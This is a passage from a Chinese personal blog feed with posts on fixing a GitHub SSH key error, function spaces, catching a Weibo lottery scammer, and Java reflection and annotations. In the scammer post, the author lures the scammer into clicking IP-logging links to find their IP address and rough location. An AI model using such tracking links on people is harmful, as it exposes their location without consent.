        <content type="html"><![CDATA[<p>情况比其他博主遇到的更为复杂，查阅了众多资料最终才得以解决</p><h2 id="第一次尝试"><a href="#第一次尝试" class="headerlink" title="第一次尝试"></a>第一次尝试</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;627136120@qq.com&quot;</span><br></pre></td></tr></table></figure><p>重新生成公钥和私钥，公钥提交到github上，失败</p><h2 id="第二次尝试"><a href="#第二次尝试" class="headerlink" title="第二次尝试"></a>第二次尝试</h2><p>查阅github官方给出的解决方案<br><a href="https://docs.github.com/en/authentication/troubleshooting-ssh/error-permission-denied-publickey">https://docs.github.com/en/authentication/troubleshooting-ssh/error-permission-denied-publickey</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-add -l -E sha256</span><br></pre></td></tr></table></figure><p>查看公钥指纹，输出为<br>The agent has no identities.<br>找到了问题的突破口</p><h2 id="第三次尝试"><a href="#第三次尝试" class="headerlink" title="第三次尝试"></a>第三次尝试</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-add /users/sketchzero/.ssh/id_rsa</span><br></pre></td></tr></table></figure><p>添加公钥指纹<br>此时</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-add -l -E sha256</span><br></pre></td></tr></table></figure><p>正常输出了公钥指纹</p><h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><p><img src="http://106.12.125.218/medias/medias/Github%E9%85%8D%E7%BD%AESSH-key%E6%97%B6%E5%87%BA%E7%8E%B0Permission-denied(publickey)/0.png"><br><img src="http://106.12.125.218/medias/medias/Github%E9%85%8D%E7%BD%AESSH-key%E6%97%B6%E5%87%BA%E7%8E%B0Permission-denied(publickey)/1.png"><br>比对公钥指纹，发现没有问题<br><img src="http://106.12.125.218/medias/medias/Github%E9%85%8D%E7%BD%AESSH-key%E6%97%B6%E5%87%BA%E7%8E%B0Permission-denied(publickey)/2.png"><br>成功！</p>]]></content>
      
      
      <categories>
          
          <category> GIT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于函数空间的简单理解</title>
      <link href="/2021/10/15/%E5%85%B3%E4%BA%8E%E5%87%BD%E6%95%B0%E7%A9%BA%E9%97%B4%E7%9A%84%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3/"/>
      <url>/2021/10/15/%E5%85%B3%E4%BA%8E%E5%87%BD%E6%95%B0%E7%A9%BA%E9%97%B4%E7%9A%84%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>围棋实际上就是一个空间，在微积分里可以定义极限和连续，依赖于<strong>距离</strong></p><h3 id="向量的距离"><a href="#向量的距离" class="headerlink" title="向量的距离"></a>向量的距离</h3><p><img src="http://106.12.125.218/medias/medias/%E5%85%B3%E4%BA%8E%E5%87%BD%E6%95%B0%E7%A9%BA%E9%97%B4%E7%9A%84%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3/0.png"></p><h3 id="函数的距离"><a href="#函数的距离" class="headerlink" title="函数的距离"></a>函数的距离<img src="http://106.12.125.218/medias/medias/%E5%85%B3%E4%BA%8E%E5%87%BD%E6%95%B0%E7%A9%BA%E9%97%B4%E7%9A%84%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3/1.png"></h3><h3 id="距离的定义"><a href="#距离的定义" class="headerlink" title="距离的定义"></a>距离的定义</h3><p><img src="http://106.12.125.218/medias/medias/%E5%85%B3%E4%BA%8E%E5%87%BD%E6%95%B0%E7%A9%BA%E9%97%B4%E7%9A%84%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3/2.png"></p><h3 id="线性空间"><a href="#线性空间" class="headerlink" title="线性空间"></a>线性空间</h3><p><img src="http://106.12.125.218/medias/medias/%E5%85%B3%E4%BA%8E%E5%87%BD%E6%95%B0%E7%A9%BA%E9%97%B4%E7%9A%84%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3/3.png"><br>为了创造一个“工作平台”，除了距离和线性空间，我们还需要再加一点什么呢。（也就是，水果-》热带水果。</p><h3 id="范数"><a href="#范数" class="headerlink" title="范数"></a>范数</h3><p><img src="http://106.12.125.218/medias/medias/%E5%85%B3%E4%BA%8E%E5%87%BD%E6%95%B0%E7%A9%BA%E9%97%B4%E7%9A%84%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3/4.png"><br>距离可以定义范数，但是范数不能定义距离。（类比距离（水果） 范数（热带水果））</p><p>赋予范数或者距离的集合分别称为：<strong>赋范空间</strong>和<strong>度量空间</strong>；<br>若在其上再加上线性结构称为<strong>线性赋范空间</strong>和<strong>线性度量空间</strong>。<br>​</p><p>那么。赋范空间有向量的模长，即范数。但是还缺乏一个很重要的概念-两个向量的夹角。为克服这一缺陷，我们引入<strong>内积</strong></p><h3 id="内积空间"><a href="#内积空间" class="headerlink" title="内积空间"></a>内积空间</h3><p><img src="http://106.12.125.218/medias/medias/%E5%85%B3%E4%BA%8E%E5%87%BD%E6%95%B0%E7%A9%BA%E9%97%B4%E7%9A%84%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3/5.png"><br>内积：（x，y）<br>线性性：也就是对第一个变元如果乘a，这个a可以提出来，就跟刚才的范数的这个东西有点类似了，但是它是对第一个（变元）<br>正定：大于等于0<br><img src="http://106.12.125.218/medias/medias/%E5%85%B3%E4%BA%8E%E5%87%BD%E6%95%B0%E7%A9%BA%E9%97%B4%E7%9A%84%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3/6.png"><br>内积可以导出范数<br><img src="http://106.12.125.218/medias/medias/%E5%85%B3%E4%BA%8E%E5%87%BD%E6%95%B0%E7%A9%BA%E9%97%B4%E7%9A%84%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3/7.png"><br>我们日常生活中的问题大都可以再欧几里得空间内解决。</p><h3 id="希尔伯特空间和巴拿赫空间"><a href="#希尔伯特空间和巴拿赫空间" class="headerlink" title="希尔伯特空间和巴拿赫空间"></a>希尔伯特空间和巴拿赫空间</h3><p><img src="http://106.12.125.218/medias/medias/%E5%85%B3%E4%BA%8E%E5%87%BD%E6%95%B0%E7%A9%BA%E9%97%B4%E7%9A%84%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3/8.png">​<br>什么是完备性？<br>就是这个空间在极限运算中，它取极限不能跑出去，就是相当于我们原来做极限的时候，有理数集不行，一定要到实数集<br>赋范空间：比内积要少一点，它完备的赋范空间就称为巴拿赫空间</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>范数可以定义“强化” 了的距离<br>内积是较距离和范数有更多内涵<br>希尔伯特空间：具有完备性的内积空间<br>巴拿赫空间：具有完备性的赋范空间</p>]]></content>
      
      
      <categories>
          
          <category> DL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>获取微博抽奖骗子的ip地址</title>
      <link href="/2021/10/01/%E8%8E%B7%E5%8F%96%E5%BE%AE%E5%8D%9A%E6%8A%BD%E5%A5%96%E9%AA%97%E5%AD%90%E7%9A%84ip%E5%9C%B0%E5%9D%80/"/>
      <url>/2021/10/01/%E8%8E%B7%E5%8F%96%E5%BE%AE%E5%8D%9A%E6%8A%BD%E5%A5%96%E9%AA%97%E5%AD%90%E7%9A%84ip%E5%9C%B0%E5%9D%80/</url>
      
        <content type="html"><![CDATA[<p>发烧了好几天，心情不太好，就想在微博上抽点奖玩玩，结果就发现了一个性价比极高的：<br><img src="http://106.12.125.218/medias/medias/%E8%8E%B7%E5%8F%96%E5%BE%AE%E5%8D%9A%E6%8A%BD%E5%A5%96%E9%AA%97%E5%AD%90%E7%9A%84ip%E5%9C%B0%E5%9D%80/0.png"><br>我立马转发<br>结果第二天我一看，<br><img src="http://106.12.125.218/medias/medias/%E8%8E%B7%E5%8F%96%E5%BE%AE%E5%8D%9A%E6%8A%BD%E5%A5%96%E9%AA%97%E5%AD%90%E7%9A%84ip%E5%9C%B0%E5%9D%80/1.png"><br>这是我中奖了吗，我中了iPhone13？？？<br>然后我来到他主页一看：<br><img src="http://106.12.125.218/medias/medias/%E8%8E%B7%E5%8F%96%E5%BE%AE%E5%8D%9A%E6%8A%BD%E5%A5%96%E9%AA%97%E5%AD%90%E7%9A%84ip%E5%9C%B0%E5%9D%80/2.png"><br><img src="http://106.12.125.218/medias/medias/%E8%8E%B7%E5%8F%96%E5%BE%AE%E5%8D%9A%E6%8A%BD%E5%A5%96%E9%AA%97%E5%AD%90%E7%9A%84ip%E5%9C%B0%E5%9D%80/3.png"><br>好家伙你这13还没开奖就又搞了个抽奖，还想让我先交钱？来知乎看了一下，发现已经有好多受害者了。（<br><a href="https://www.zhihu.com/question/437835565/answer/1827689954%EF%BC%89">https://www.zhihu.com/question/437835565/answer/1827689954）</a><br>我立马举报。<br>骗子这么嚣张，必须被打击打击才行啊<br>那么用个简单的小工具发链接查查骗子的ip地址好了<br><img src="http://106.12.125.218/medias/medias/%E8%8E%B7%E5%8F%96%E5%BE%AE%E5%8D%9A%E6%8A%BD%E5%A5%96%E9%AA%97%E5%AD%90%E7%9A%84ip%E5%9C%B0%E5%9D%80/4.png"><br><img src="http://106.12.125.218/medias/medias/%E8%8E%B7%E5%8F%96%E5%BE%AE%E5%8D%9A%E6%8A%BD%E5%A5%96%E9%AA%97%E5%AD%90%E7%9A%84ip%E5%9C%B0%E5%9D%80/5.png"><br><img src="http://106.12.125.218/medias/medias/%E8%8E%B7%E5%8F%96%E5%BE%AE%E5%8D%9A%E6%8A%BD%E5%A5%96%E9%AA%97%E5%AD%90%E7%9A%84ip%E5%9C%B0%E5%9D%80/6.png"><br>骗子点了之后，为了再验证一下，换了个链接让骗子再点一次<br><img src="http://106.12.125.218/medias/medias/%E8%8E%B7%E5%8F%96%E5%BE%AE%E5%8D%9A%E6%8A%BD%E5%A5%96%E9%AA%97%E5%AD%90%E7%9A%84ip%E5%9C%B0%E5%9D%80/7.png"></p><p><img src="http://106.12.125.218/medias/medias/%E8%8E%B7%E5%8F%96%E5%BE%AE%E5%8D%9A%E6%8A%BD%E5%A5%96%E9%AA%97%E5%AD%90%E7%9A%84ip%E5%9C%B0%E5%9D%80/8.png"><br>骗子非常顺利的上钩了<br>那么图中的两个网页链接呢，骗子每个都点了，返回的值都对应着这个ip</p><p><img src="http://106.12.125.218/medias/medias/%E8%8E%B7%E5%8F%96%E5%BE%AE%E5%8D%9A%E6%8A%BD%E5%A5%96%E9%AA%97%E5%AD%90%E7%9A%84ip%E5%9C%B0%E5%9D%80/9.png"><br>​</p><p><img src="http://106.12.125.218/medias/medias/%E8%8E%B7%E5%8F%96%E5%BE%AE%E5%8D%9A%E6%8A%BD%E5%A5%96%E9%AA%97%E5%AD%90%E7%9A%84ip%E5%9C%B0%E5%9D%80/10.png"><br><img src="http://106.12.125.218/medias/medias/%E8%8E%B7%E5%8F%96%E5%BE%AE%E5%8D%9A%E6%8A%BD%E5%A5%96%E9%AA%97%E5%AD%90%E7%9A%84ip%E5%9C%B0%E5%9D%80/11.png"><br>那么大概就是在这附近了<br>所以，能不能把他们全都抓起来？</p>]]></content>
      
      
      <categories>
          
          <category> INTERESTING </category>
          
      </categories>
      
      
        <tags>
            
            <tag> interesting </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java笔记-注解和反射</title>
      <link href="/2021/09/14/Java%E7%AC%94%E8%AE%B0-%E6%B3%A8%E8%A7%A3%E5%92%8C%E5%8F%8D%E5%B0%84/"/>
      <url>/2021/09/14/Java%E7%AC%94%E8%AE%B0-%E6%B3%A8%E8%A7%A3%E5%92%8C%E5%8F%8D%E5%B0%84/</url>
      
        <content type="html"><![CDATA[<h2 id="12-反射操作泛型"><a href="#12-反射操作泛型" class="headerlink" title="12.反射操作泛型"></a>12.反射操作泛型</h2><p>Java采用泛型擦除的机制来引入泛型,Java中的泛型仅仅是给编译器javac使用的,确保数据的安全性和免去强制类型转换问题，但是，一旦编译完成﹐所有和泛型有关的类型型全部擦除<br>为了通过反射操作这些类型,Java新增了ParameterizedType , GenericArrayType ,TypeVariable和 Wildcardlype 几种类型来代表不能被归一到Class 类中的类型，但是又和原始数据类型齐名的类型。<br>1.ParameterizedType： 表示一种参数化类型，比如Collection<br>2.GenericArrayType: 表示一种元素类型是参数化类型或者类型变量的数组类型<br>3.TypeVariable: 是各种类型变量的公共父接口<br>4.WildcardType: 代表一种通配符类型表达式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">package cn.bloghut.reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.ParameterizedType;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.<span class="type">Type</span>;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.<span class="type">List</span>;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @author by 闲言</span><br><span class="line"> * @classname Test11</span><br><span class="line"> * @description TODO</span><br><span class="line"> * @date <span class="number">2021</span>/<span class="number">7</span>/<span class="number">31</span> <span class="number">22</span>:<span class="number">59</span></span><br><span class="line"> */</span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">Test11</span> &#123;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">void</span> <span class="title">test01</span>(<span class="params">Map&lt;String, User&gt; <span class="built_in">map</span>, <span class="type">List</span>&lt;User&gt; <span class="built_in">list</span></span>) &#123;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">Map</span>&lt;<span class="title">String</span>, <span class="title">User</span>&gt; <span class="title">test02</span>() &#123;</span></span><br><span class="line"><span class="class">        <span class="title">return</span> <span class="title">null</span>;</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">static</span> <span class="title">void</span> <span class="title">main</span>(<span class="params">String[] args</span>) <span class="title">throws</span> <span class="title">Exception</span> &#123;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">        <span class="title">Class</span>&lt;<span class="title">Test11</span>&gt; <span class="title">c1</span> = <span class="title">Test11</span>.<span class="title">class</span>;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">        <span class="title">Method</span> <span class="title">test01</span> = <span class="title">c1</span>.<span class="title">getMethod</span>(<span class="params"><span class="string">&quot;test01&quot;</span>, Map.<span class="keyword">class</span>, <span class="type">List</span>.<span class="keyword">class</span></span>);</span></span><br><span class="line"><span class="class">        //获取参数的泛型参数类型</span></span><br><span class="line"><span class="class">        <span class="title">Type</span>[] <span class="title">genericParameterTypes</span> = <span class="title">test01</span>.<span class="title">getGenericParameterTypes</span>();</span></span><br><span class="line"><span class="class">        <span class="title">for</span> (<span class="params"><span class="type">Type</span> genericParameterType : genericParameterTypes</span>) &#123;</span></span><br><span class="line"><span class="class">            <span class="title">System</span>.<span class="title">out</span>.<span class="title">println</span>(<span class="params">genericParameterType</span>);</span></span><br><span class="line"><span class="class">            //判断这个泛型是不是参数化类型</span></span><br><span class="line"><span class="class">            <span class="title">if</span> (<span class="params">genericParameterType instanceof ParameterizedType</span>)&#123;</span></span><br><span class="line"><span class="class">                <span class="title">Type</span>[] <span class="title">actualTypeArguments</span> = (<span class="params">(<span class="params">ParameterizedType</span>) genericParameterType</span>).<span class="title">getActualTypeArguments</span>();</span></span><br><span class="line"><span class="class">                <span class="title">for</span> (<span class="params"><span class="type">Type</span> actualTypeArgument : actualTypeArguments</span>) &#123;</span></span><br><span class="line"><span class="class">                    <span class="title">System</span>.<span class="title">out</span>.<span class="title">println</span>(<span class="params">actualTypeArgument</span>);</span></span><br><span class="line"><span class="class">                &#125;</span></span><br><span class="line"><span class="class">            &#125;</span></span><br><span class="line"><span class="class">        &#125;</span></span><br><span class="line"><span class="class">        <span class="title">System</span>.<span class="title">out</span>.<span class="title">println</span>(<span class="params"><span class="string">&quot;===================================================================&quot;</span></span>);</span></span><br><span class="line"><span class="class">        <span class="title">Method</span> <span class="title">method</span> = <span class="title">c1</span>.<span class="title">getMethod</span>(<span class="params"><span class="string">&quot;test02&quot;</span></span>);</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">        <span class="title">Type</span> <span class="title">type</span> = <span class="title">method</span>.<span class="title">getGenericReturnType</span>();</span></span><br><span class="line"><span class="class">        <span class="title">if</span> (<span class="params"><span class="built_in">type</span> instanceof  ParameterizedType</span>)&#123;</span></span><br><span class="line"><span class="class">            <span class="title">Type</span>[] <span class="title">actualTypeArguments</span> = (<span class="params">(<span class="params">ParameterizedType</span>) <span class="built_in">type</span></span>).<span class="title">getActualTypeArguments</span>();</span></span><br><span class="line"><span class="class">            <span class="title">for</span> (<span class="params"><span class="type">Type</span> actualTypeArgument : actualTypeArguments</span>) &#123;</span></span><br><span class="line"><span class="class">                <span class="title">System</span>.<span class="title">out</span>.<span class="title">println</span>(<span class="params">actualTypeArgument</span>);</span></span><br><span class="line"><span class="class">            &#125;</span></span><br><span class="line"><span class="class">        &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">//控制台打印</span></span><br><span class="line"><span class="class"><span class="title">java</span>.<span class="title">util</span>.<span class="title">Map</span>&lt;<span class="title">java</span>.<span class="title">lang</span>.<span class="title">String</span>, <span class="title">cn</span>.<span class="title">bloghut</span>.<span class="title">reflection</span>.<span class="title">User</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">String</span></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">cn</span>.<span class="title">bloghut</span>.<span class="title">reflection</span>.<span class="title">User</span></span></span><br><span class="line"><span class="class"><span class="title">java</span>.<span class="title">util</span>.<span class="title">List</span>&lt;<span class="title">cn</span>.<span class="title">bloghut</span>.<span class="title">reflection</span>.<span class="title">User</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">cn</span>.<span class="title">bloghut</span>.<span class="title">reflection</span>.<span class="title">User</span></span></span><br><span class="line"><span class="class">===================================================================</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">String</span></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">cn</span>.<span class="title">bloghut</span>.<span class="title">reflection</span>.<span class="title">User</span></span></span><br></pre></td></tr></table></figure><h2 id="13-获取注解信息"><a href="#13-获取注解信息" class="headerlink" title="13.获取注解信息"></a>13.获取注解信息</h2><p>getAnnotation<br>getAnnotations<br>练习：ORM<br>了解什么是ORM？<br>Object relationship Mapping –》对象关系映射<br><img src="http://106.12.125.218/medias/medias/Java%E7%AC%94%E8%AE%B0-%E6%B3%A8%E8%A7%A3%E5%92%8C%E5%8F%8D%E5%B0%84/16.png"><br>1.类和表结构对应<br>2.属性和字段对应<br>3.对象和记录对应</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">package cn.bloghut.annotation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">Test04</span>&#123;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">static</span> <span class="title">void</span> <span class="title">main</span>(<span class="params">String[] args</span>) <span class="title">throws</span> <span class="title">Exception</span>&#123;</span></span><br><span class="line"><span class="class">        //1.获取<span class="title">Class</span>类对象</span></span><br><span class="line"><span class="class">        <span class="title">Class</span>&lt;?&gt; <span class="title">c</span> = <span class="title">Class</span>.<span class="title">forName</span>(<span class="params"><span class="string">&quot;cn.bloghut.annotation.Student&quot;</span></span>);</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">        //2.通过反射获取注解</span></span><br><span class="line"><span class="class">        <span class="title">Annotation</span>[] <span class="title">annotations</span> = <span class="title">c</span>.<span class="title">getAnnotations</span>();</span></span><br><span class="line"><span class="class">        <span class="title">for</span> (<span class="params">Annotation annotation : annotations</span>) &#123;</span></span><br><span class="line"><span class="class">            <span class="title">System</span>.<span class="title">out</span>.<span class="title">println</span>(<span class="params">annotation</span>);</span></span><br><span class="line"><span class="class">        &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">        //获取注解的<span class="title">value</span>值</span></span><br><span class="line"><span class="class">        <span class="title">TableXy</span> <span class="title">tableXy</span> = <span class="title">c</span>.<span class="title">getAnnotation</span>(<span class="params">TableXy.<span class="keyword">class</span></span>);</span></span><br><span class="line"><span class="class">        <span class="title">String</span> <span class="title">value</span> = <span class="title">tableXy</span>.<span class="title">value</span>();</span></span><br><span class="line"><span class="class">        <span class="title">System</span>.<span class="title">out</span>.<span class="title">println</span>(<span class="params">value</span>);</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">        //获取类指定的注解</span></span><br><span class="line"><span class="class">        //暴力反射</span></span><br><span class="line"><span class="class">        <span class="title">Field</span> <span class="title">field</span> = <span class="title">c</span>.<span class="title">getDeclaredField</span>(<span class="params"><span class="string">&quot;name&quot;</span></span>);</span></span><br><span class="line"><span class="class">        <span class="title">FieldXy</span> <span class="title">fieldXy</span> = <span class="title">field</span>.<span class="title">getAnnotation</span>(<span class="params">FieldXy.<span class="keyword">class</span></span>);</span></span><br><span class="line"><span class="class">        <span class="title">String</span> <span class="title">columnName</span> = <span class="title">fieldXy</span>.<span class="title">columnName</span>();</span></span><br><span class="line"><span class="class">        <span class="title">String</span> <span class="title">type</span> = <span class="title">fieldXy</span>.<span class="title">type</span>();</span></span><br><span class="line"><span class="class">        <span class="title">int</span> <span class="title">length</span> = <span class="title">fieldXy</span>.<span class="title">length</span>();</span></span><br><span class="line"><span class="class">        <span class="title">System</span>.<span class="title">out</span>.<span class="title">println</span>(<span class="params"><span class="string">&quot;columnName：&quot;</span>+columnName+<span class="string">&quot;   type：&quot;</span>+<span class="built_in">type</span>+<span class="string">&quot;   length：&quot;</span>+length</span>);</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">@<span class="title">TableXy</span>(<span class="params"><span class="string">&quot;db_student&quot;</span></span>)</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">Student</span> &#123;</span></span><br><span class="line"><span class="class">    @<span class="title">FieldXy</span>(<span class="params">columnName = <span class="string">&quot;db_id&quot;</span>,<span class="built_in">type</span> = <span class="string">&quot;int&quot;</span>,length = <span class="number">18</span></span>)</span></span><br><span class="line"><span class="class">    <span class="title">private</span> <span class="title">int</span> <span class="title">id</span>;</span></span><br><span class="line"><span class="class">    @<span class="title">FieldXy</span>(<span class="params">columnName = <span class="string">&quot;db_age&quot;</span>,<span class="built_in">type</span> = <span class="string">&quot;int&quot;</span>,length = <span class="number">10</span></span>)</span></span><br><span class="line"><span class="class">    <span class="title">private</span> <span class="title">int</span> <span class="title">age</span>;</span></span><br><span class="line"><span class="class">    @<span class="title">FieldXy</span>(<span class="params">columnName = <span class="string">&quot;db_name&quot;</span>,<span class="built_in">type</span> = <span class="string">&quot;varchar&quot;</span>,length = <span class="number">3</span></span>)</span></span><br><span class="line"><span class="class">    <span class="title">private</span> <span class="title">String</span> <span class="title">name</span>;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">Student</span>() &#123;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    @<span class="title">Override</span></span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">String</span> <span class="title">toString</span>() &#123;</span></span><br><span class="line"><span class="class">        <span class="title">return</span> &quot;<span class="title">Student</span>&#123;&quot; +</span></span><br><span class="line"><span class="class">                &quot;<span class="title">id</span>=&quot; + <span class="title">id</span> +</span></span><br><span class="line"><span class="class">                &quot;, <span class="title">age</span>=&quot; + <span class="title">age</span> +</span></span><br><span class="line"><span class="class">                &quot;, <span class="title">name</span>=&#x27;&quot; + <span class="title">name</span> + &#x27;\&#x27;&#x27; +</span></span><br><span class="line"><span class="class">                &#x27;&#125;&#x27;;</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">int</span> <span class="title">getId</span>() &#123;</span></span><br><span class="line"><span class="class">        <span class="title">return</span> <span class="title">id</span>;</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">void</span> <span class="title">setId</span>(<span class="params"><span class="built_in">int</span> <span class="built_in">id</span></span>) &#123;</span></span><br><span class="line"><span class="class">        <span class="title">this</span>.<span class="title">id</span> = <span class="title">id</span>;</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">int</span> <span class="title">getAge</span>() &#123;</span></span><br><span class="line"><span class="class">        <span class="title">return</span> <span class="title">age</span>;</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span 